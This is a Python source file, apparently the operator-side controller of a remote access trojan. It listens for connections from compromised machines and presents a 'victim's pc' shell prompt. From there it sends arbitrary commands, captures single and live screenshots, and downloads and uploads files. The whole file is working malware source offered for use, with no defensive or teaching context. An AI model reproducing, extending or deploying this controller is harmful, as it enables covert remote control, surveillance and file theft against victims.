import time
import sys
import socket
import os
import random

print("\033[45m Concept & coded by\033[31m :\033[91m ghostdtdn \033[0m ")

s = socket.socket()
host = sys.argv[1]#str(input("set host> "))
port = int(sys.argv[2])#int(input("set port> "))

#port = 8080
s.bind((host, port))
print('[*] ' + host + ':' +  str(port))
print("\033[93msearching\033[5m...\033[0m")
_users =[]
for i in range(10):
	s.listen(i)
	conn, addr = s.accept()
	f = open("outPut.txt", 'wb')
			
	#while (True):
	#l = conn.recv(1024)
		
	n = 1
	while n == 1:
		#f.write(l)
		l = conn.recv(1024)
		f.write(l)
		if len(l) < 1024:
			n = 2
			#print("Done")
			#print(str(l))
			#print(len(l))
		#print(l)
			
			f.close()
	print("\033[0m\033[3m\033[90m")
	print("\033[0m\033[3m" + str(os.system("cat outPut.txt")))



#________________________________________________________________________________________________
	def _send(_file):
		f = open(_file, 'rb')
		print(_file)
		l = f.read(1024)
		print(str(l))	
		while (l):
			conn.send(l)
			l = f.read(1024)

		print("File Sent!")
				
		f.close()

#________________________________________________________________________________________________
	def _recv(_ext):
		#conn.send(msg.encode())
		fName = str(int(random.random()*100000000000)) + "." + _ext
		
		f = open(fName, 'wb')
		
		n = 1
		while n == 1:
				#f.write(l)
			l = conn.recv(1024)
			f.write(l)
			if len(l) < 1024:
				n = 2
			
			
		print("\033[0m[\033[0m\033[1m\033[92m+\033[0m] " +fName + " saved successfully!")	
		f.close()

	
	print(addr, " \033[0m\033[1m\033[92m\033[5mconnected\033[0m")
	_users += [addr]
	_x = 4
	while _x == 4 :
		msg = input(str("\033[93mvictim's pc:~\033[91m\033[1m$\033[0m\033[94m "))
		cmd_array = msg.split()
		if (msg == "/"):
			_x += 10
			conn.send(msg.encode())
			print("\033[36m[\033[33m-\033[36m]\033[0m Session \033[91mclosed\033[5m\033[1m\033[91m!\033[0m")
		elif (msg == "dump_ss"):
			conn.send(msg.encode())
			_recv("jpg")
		elif (msg == "live_screen"):
			conn.send(msg.encode())
			key = 1
			while key == 1:
				
		
				f = open("screenshot.jpg", 'wb')
				
				n = 1
				while n == 1:
						#f.write(l)
					l = conn.recv(1024)
					f.write(l)
					if len(l) < 1024:
						n = 2
					
					
				print("\033[0m[\033[0m\033[1m\033[92m+\033[0m] screenshot saved successfully!")	
				f.close()

				time.sleep(2)
		elif (str(cmd_array[0]) == "download"):
			cmd = msg.split('.')
			
			conn.send(msg.encode())
			
			_recv(cmd[-1])
			
			#recv(cmd_array[1])
		elif (str(cmd_array[0]) == "upload"):
			cmd = msg.split('.')
			
			conn.send(msg.encode())
			
			_send(str(cmd_array[1]))
		else:
			
			conn.send(msg.encode())
		
			f = open("outPut.txt", 'wb')
			
			#while (True):
			#l = conn.recv(1024)
			
			n = 1
			while n == 1:
				#f.write(l)
				l = conn.recv(1024)
				f.write(l)
				if len(l) < 1024:
					n = 2
					#print("Done")
				#print(str(l))
				#print(len(l))
			#print(l)
			
			f.close()
			print("\033[0m\033[3m\033[90m")
			print("\033[0m\033[3m" + str(os.system("cat outPut.txt")))


print(_users)
